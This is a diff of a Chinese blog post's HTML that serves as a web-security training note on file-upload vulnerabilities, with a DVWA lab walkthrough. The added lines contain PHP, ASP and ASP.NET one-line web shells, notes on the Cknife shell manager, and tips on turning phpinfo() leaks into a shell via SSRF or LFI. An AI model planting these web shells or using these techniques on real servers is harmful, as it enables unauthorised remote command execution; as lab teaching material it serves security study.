@@ -28,7 +28,7 @@
 <meta property="og:image" content="https://qianfei11.github.io/pics/WEB集训/三/7.png">
 <meta property="og:image" content="https://qianfei11.github.io/pics/WEB集训/三/8.png">
 <meta property="og:image" content="https://qianfei11.github.io/pics/WEB集训/三/9.png">
-<meta property="og:updated_time" content="2019-05-02T15:38:13.092Z">
+<meta property="og:updated_time" content="2019-05-12T15:46:29.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="WEB入门（三）">
 <meta name="twitter:description" content="今天学姐主要讲了文件上传漏洞，了解了Cknife等工具的使用。">
@@ -69,9 +69,31 @@
 
 
   
+  
+  <div class="site-header-image">
+    <img id="originBg" width="100%" alt="Hike News" src>
+  </div>
+
+  <div id="header-blur" class="site-header-image blur" style="position: absolute; top:0; height: 207px; min-height: 207px; min-width: 100%;">
+    <img id="blurBg" width="100%" style="top: 96%" alt="Hike News" src>
+  </div>
+
+  <script>
+        var imgUrls = "css/images/pose01.jpg".split(",");
+        var random = Math.floor((Math.random() * imgUrls.length ));
+        if (imgUrls[random].startsWith('http') || imgUrls[random].indexOf('://') >= 0) {
+          document.getElementById("originBg").src=imgUrls[random];
+          document.getElementById("blurBg").src=imgUrls[random];
+        } else {
+          document.getElementById("originBg").src='/' + imgUrls[random];
+          document.getElementById("blurBg").src='/' + imgUrls[random];
+        }
+    </script>
 
 
-<header id="allheader" class="site-header" role="banner">
+
+
+<header id="allheader" class="site-header" role="banner" style="width: 100%; position: absolute; top:0; background: rgba(255,255,255,.8);">
   <div class="clearfix container">
       <div class="site-branding">
 
@@ -146,16 +168,94 @@
 <h2 id="木马"><a href="#木马" class="headerlink" title="木马"></a>木马</h2><p>根据语言分类，有PHP、ASP、JSP、ASP.NET等不同语言下的木马；根据作用分类，有大马和小马。</p>
 <p>PHP一句话木马：</p>
 <ul>
-<li><figure class="highlight plain"><figcaption><span>ehco shell_exec($_GET['a']); ?>```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- ```&lt;?php ehco shell_exec($_POST[&apos;a&apos;]); ?&gt;</span><br></pre></td></tr></table></figure>
-</li>
-<li><figure class="highlight plain"><figcaption><span>@eval($_POST['a']); ?>```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ASP一句话木马：</span><br><span class="line"></span><br><span class="line">- ```&lt;%eval request(&quot;Cknife&quot;)%&gt;</span><br></pre></td></tr></table></figure>
-</li>
+<li><code>&lt;?php ehco shell_exec($_GET[&#39;a&#39;]); ?&gt;</code></li>
+<li><code>&lt;?php ehco shell_exec($_POST[&#39;a&#39;]); ?&gt;</code></li>
+<li><code>&lt;?php @eval($_POST[&#39;a&#39;]); ?&gt;</code></li>
+</ul>
+<p>ASP一句话木马：</p>
+<ul>
+<li><code>&lt;%eval request(&quot;Cknife&quot;)%&gt;</code></li>
 </ul>
 <p>ASP.NET一句话木马：</p>
 <ul>
-<li><figure class="highlight plain"><figcaption><span>Page Language</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 利用函数</span><br><span class="line"></span><br><span class="line">1. shell_exec(): 通过环境执行命令，并且将完整的输出以字符串的方式返回。</span><br><span class="line">2. eval(): 把字符串作为PHP代码执行执行a接收到的内容。</span><br><span class="line"></span><br><span class="line">## phpinfo()</span><br><span class="line"></span><br><span class="line">|   介绍   |        内容        |</span><br><span class="line">| :------: | :----------------: |</span><br><span class="line">|   语法   | int phpinfo(void); |</span><br><span class="line">|  返回值  |        整数        |</span><br><span class="line">| 函数种类 |    PHP系统功能     |</span><br><span class="line"></span><br><span class="line">phpinfo()会泄漏很多敏感的信息。</span><br><span class="line"></span><br><span class="line">1. 绝对路径（_SERVER[&quot;script_FILENAME&quot;]）</span><br><span class="line"></span><br><span class="line">找到phpinfo()可以直接找到网站的绝对路径。</span><br><span class="line"></span><br><span class="line">2. 支持的程序</span><br><span class="line"></span><br><span class="line">可以查看一些特殊的程序服务，诸如redis、memcache、mysql、SMTP、curl。要是服务器装了redis或者memcache，就可以通过ssrf来getshell。</span><br><span class="line"></span><br><span class="line">3. 泄漏真实ip（_SERVER[&quot;SERVER_ADDR&quot;]或者SERVER_ADDR）</span><br><span class="line"></span><br><span class="line">得到的ip可以直接用来查旁站和c段。</span><br><span class="line"></span><br><span class="line">4. GOPHER</span><br><span class="line"></span><br><span class="line">如果支持gopher也能直接用ssrf。</span><br><span class="line"></span><br><span class="line">5. fastcgi</span><br><span class="line"></span><br><span class="line">查看是否开启fastcgi和查看fastcgi的版本，可能导致解析漏洞、远程命令执行、任意文件读取等问题。</span><br><span class="line"></span><br><span class="line">6. 泄漏缓存文件地址（_FILES[&quot;file1&quot;]）</span><br><span class="line"></span><br><span class="line">向phpinfo()post一个shell后，可以在&quot;_FILE[&quot;file1&quot;]&quot;中看到上传的临时文件，如果有个LFI，便可以直接getshell。</span><br><span class="line"></span><br><span class="line">7. 一些敏感配置</span><br><span class="line"></span><br><span class="line">&gt; * allow_url_include：远程文件包含</span><br><span class="line">&gt; * disable_functions：查看金庸函数</span><br><span class="line">&gt; * open_basedir：读取一些没权限的目录</span><br><span class="line"></span><br><span class="line">还能获取一些环境信息，如environment中的path、log等。</span><br><span class="line"></span><br><span class="line">## Linux基本命令</span><br><span class="line"></span><br><span class="line">- ls：列出当前目录下所有文件</span><br><span class="line">- pwd：查看文件当前目录</span><br><span class="line"></span><br><span class="line"># Cknife（菜刀）</span><br><span class="line"></span><br><span class="line">超级强大的网站管理工，分为客户端和代码两部分</span><br><span class="line"></span><br><span class="line">只要将那简短的一句话代码放到网站上去就可以取得网站的权限</span><br><span class="line"></span><br><span class="line">运行环境：安装了JRE1.7+环境的所有操作系统</span><br><span class="line"></span><br><span class="line">主要功能：文件管理、虚拟终端、数据库管理</span><br><span class="line"></span><br><span class="line">## DVWA之File Upload</span><br><span class="line"></span><br><span class="line">low level的测试一下，源码中没有对任何文件格式进行过滤：</span><br><span class="line"></span><br><span class="line">1. 写出一句话木马</span><br><span class="line"></span><br><span class="line">用菜刀连接的一句话木马：</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">&lt;?php @eval($_POST[&apos;a&apos;]; ?&gt;</span><br></pre></td></tr></table></figure>
-</li>
+<li><code>&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;Cknife&quot;],&quot;unsafe&quot;);%&gt;</code></li>
 </ul>
+<h2 id="利用函数"><a href="#利用函数" class="headerlink" title="利用函数"></a>利用函数</h2><ol>
+<li>shell_exec(): 通过环境执行命令，并且将完整的输出以字符串的方式返回。</li>
+<li>eval(): 把字符串作为PHP代码执行执行a接收到的内容。</li>
+</ol>
+<h2 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo()"></a>phpinfo()</h2><table>
+<thead>
+<tr>
+<th style="text-align:center">介绍</th>
+<th style="text-align:center">内容</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">语法</td>
+<td style="text-align:center">int phpinfo(void);</td>
+</tr>
+<tr>
+<td style="text-align:center">返回值</td>
+<td style="text-align:center">整数</td>
+</tr>
+<tr>
+<td style="text-align:center">函数种类</td>
+<td style="text-align:center">PHP系统功能</td>
+</tr>
+</tbody>
+</table>
+<p>phpinfo()会泄漏很多敏感的信息。</p>
+<ol>
+<li>绝对路径（_SERVER[“script_FILENAME”]）</li>
+</ol>
+<p>找到phpinfo()可以直接找到网站的绝对路径。</p>
+<ol start="2">
+<li>支持的程序</li>
+</ol>
+<p>可以查看一些特殊的程序服务，诸如redis、memcache、mysql、SMTP、curl。要是服务器装了redis或者memcache，就可以通过ssrf来getshell。</p>
+<ol start="3">
+<li>泄漏真实ip（_SERVER[“SERVER_ADDR”]或者SERVER_ADDR）</li>
+</ol>
+<p>得到的ip可以直接用来查旁站和c段。</p>
+<ol start="4">
+<li>GOPHER</li>
+</ol>
+<p>如果支持gopher也能直接用ssrf。</p>
+<ol start="5">
+<li>fastcgi</li>
+</ol>
+<p>查看是否开启fastcgi和查看fastcgi的版本，可能导致解析漏洞、远程命令执行、任意文件读取等问题。</p>
+<ol start="6">
+<li>泄漏缓存文件地址（_FILES[“file1”]）</li>
+</ol>
+<p>向phpinfo()post一个shell后，可以在”_FILE[“file1”]”中看到上传的临时文件，如果有个LFI，便可以直接getshell。</p>
+<ol start="7">
+<li>一些敏感配置</li>
+</ol>
+<blockquote>
+<ul>
+<li>allow_url_include：远程文件包含</li>
+<li>disable_functions：查看金庸函数</li>
+<li>open_basedir：读取一些没权限的目录</li>
+</ul>
+</blockquote>
+<p>还能获取一些环境信息，如environment中的path、log等。</p>
+<h2 id="Linux基本命令"><a href="#Linux基本命令" class="headerlink" title="Linux基本命令"></a>Linux基本命令</h2><ul>
+<li>ls：列出当前目录下所有文件</li>
+<li>pwd：查看文件当前目录</li>
+</ul>
+<h1 id="Cknife（菜刀）"><a href="#Cknife（菜刀）" class="headerlink" title="Cknife（菜刀）"></a>Cknife（菜刀）</h1><p>超级强大的网站管理工，分为客户端和代码两部分</p>
+<p>只要将那简短的一句话代码放到网站上去就可以取得网站的权限</p>
+<p>运行环境：安装了JRE1.7+环境的所有操作系统</p>
+<p>主要功能：文件管理、虚拟终端、数据库管理</p>
+<h2 id="DVWA之File-Upload"><a href="#DVWA之File-Upload" class="headerlink" title="DVWA之File Upload"></a>DVWA之File Upload</h2><p>low level的测试一下，源码中没有对任何文件格式进行过滤：</p>
+<ol>
+<li>写出一句话木马</li>
+</ol>
+<p>用菜刀连接的一句话木马：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'a'</span>]; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>直接在网页下通过GET的一句话木马：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> shell_exec($_GET[<span class="string">'a'</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>在网页下用hackbar通过POST的一句话木马：</p>
@@ -314,7 +414,7 @@
     <div id="toc" class="toc-article">
     <strong class="toc-title">Contents</strong>
     
-      <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#文件上传漏洞"><span class="nav-number">1.</span> <span class="nav-text">文件上传漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#木马"><span class="nav-number">1.1.</span> <span class="nav-text">木马</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#文件上传漏洞检测"><span class="nav-number">2.</span> <span class="nav-text">文件上传漏洞检测</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#客户端javascript检测"><span class="nav-number">2.1.</span> <span class="nav-text">客户端javascript检测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#服务端检测绕过（MIME类型检测）"><span class="nav-number">2.2.</span> <span class="nav-text">服务端检测绕过（MIME类型检测）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#服务端目录路径检测"><span class="nav-number">2.3.</span> <span class="nav-text">服务端目录路径检测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#服务端文件扩展名检测"><span class="nav-number">2.4.</span> <span class="nav-text">服务端文件扩展名检测</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#黑名单检测"><span class="nav-number">2.4.1.</span> <span class="nav-text">黑名单检测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#白名单检测"><span class="nav-number">2.4.2.</span> <span class="nav-text">白名单检测</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#服务端文件内容检测"><span class="nav-number">2.5.</span> <span class="nav-text">服务端文件内容检测</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Upload-Labs"><span class="nav-number">3.</span> <span class="nav-text">Upload-Labs</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-01"><span class="nav-number">3.1.</span> <span class="nav-text">pass-01</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-02"><span class="nav-number">3.2.</span> <span class="nav-text">pass-02</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-11"><span class="nav-number">3.3.</span> <span class="nav-text">pass-11</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#实验吧之上传绕过"><span class="nav-number">4.</span> <span class="nav-text">实验吧之上传绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00截断上传"><span class="nav-number">4.1.</span> <span class="nav-text">0x00截断上传</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考网站"><span class="nav-number">5.</span> <span class="nav-text">参考网站</span></a></li></ol>
+      <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#文件上传漏洞"><span class="nav-number">1.</span> <span class="nav-text">文件上传漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#木马"><span class="nav-number">1.1.</span> <span class="nav-text">木马</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用函数"><span class="nav-number">1.2.</span> <span class="nav-text">利用函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#phpinfo"><span class="nav-number">1.3.</span> <span class="nav-text">phpinfo()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux基本命令"><span class="nav-number">1.4.</span> <span class="nav-text">Linux基本命令</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Cknife（菜刀）"><span class="nav-number">2.</span> <span class="nav-text">Cknife（菜刀）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#DVWA之File-Upload"><span class="nav-number">2.1.</span> <span class="nav-text">DVWA之File Upload</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#文件上传漏洞检测"><span class="nav-number">3.</span> <span class="nav-text">文件上传漏洞检测</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#客户端javascript检测"><span class="nav-number">3.1.</span> <span class="nav-text">客户端javascript检测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#服务端检测绕过（MIME类型检测）"><span class="nav-number">3.2.</span> <span class="nav-text">服务端检测绕过（MIME类型检测）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#服务端目录路径检测"><span class="nav-number">3.3.</span> <span class="nav-text">服务端目录路径检测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#服务端文件扩展名检测"><span class="nav-number">3.4.</span> <span class="nav-text">服务端文件扩展名检测</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#黑名单检测"><span class="nav-number">3.4.1.</span> <span class="nav-text">黑名单检测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#白名单检测"><span class="nav-number">3.4.2.</span> <span class="nav-text">白名单检测</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#服务端文件内容检测"><span class="nav-number">3.5.</span> <span class="nav-text">服务端文件内容检测</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Upload-Labs"><span class="nav-number">4.</span> <span class="nav-text">Upload-Labs</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-01"><span class="nav-number">4.1.</span> <span class="nav-text">pass-01</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-02"><span class="nav-number">4.2.</span> <span class="nav-text">pass-02</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-11"><span class="nav-number">4.3.</span> <span class="nav-text">pass-11</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#实验吧之上传绕过"><span class="nav-number">5.</span> <span class="nav-text">实验吧之上传绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00截断上传"><span class="nav-number">5.1.</span> <span class="nav-text">0x00截断上传</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考网站"><span class="nav-number">6.</span> <span class="nav-text">参考网站</span></a></li></ol>
     
     </div>
   </aside>
@@ -360,6 +460,9 @@
 
 
     <!-- headerblur min height -->
+    
+      var headerblur = document.getElementById("header-blur");
+      headerblur.style.minHeight = window.getComputedStyle(document.getElementById("allheader"), null).height;
     
     
 </script>
